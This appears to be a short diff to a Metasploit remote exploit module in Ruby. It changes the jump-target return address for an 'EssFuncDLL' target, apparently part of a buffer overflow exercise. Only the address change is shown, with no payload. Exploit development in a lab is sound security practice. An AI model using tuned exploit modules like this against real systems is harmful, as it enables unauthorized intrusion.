@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Exploit::Remote   # This is a remote exploit modul
       [
         [ 'EssFuncDLL-JMPTRGT',
           {
-            'jmptrgt' => 0x6250184E # This will be available in [target['jmptrgt']]
+            'jmptrgt' => 0x6250103B # This will be available in [target['jmptrgt']]
           }
         ]
       ],
